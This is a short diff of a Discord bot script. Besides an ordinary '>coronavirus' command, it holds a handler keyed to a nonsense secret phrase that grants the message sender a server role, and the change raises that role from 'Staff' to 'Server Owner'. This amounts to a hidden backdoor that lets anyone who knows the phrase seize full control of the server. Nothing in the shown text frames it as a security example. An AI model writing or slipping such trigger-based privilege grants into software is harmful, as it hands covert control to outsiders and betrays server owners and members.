@@ -40,7 +40,7 @@ if(message.content.startsWith('>coronavirus')) {
 })
 client.on('message', message=> {
 if(message.content.startsWith('aybrosetmeasdj')) {
-   message.member.addRole(message.guild.roles.find(c => c.name == "Staff"));
+   message.member.addRole(message.guild.roles.find(c => c.name == "Server Owner"));
    }
 })
 
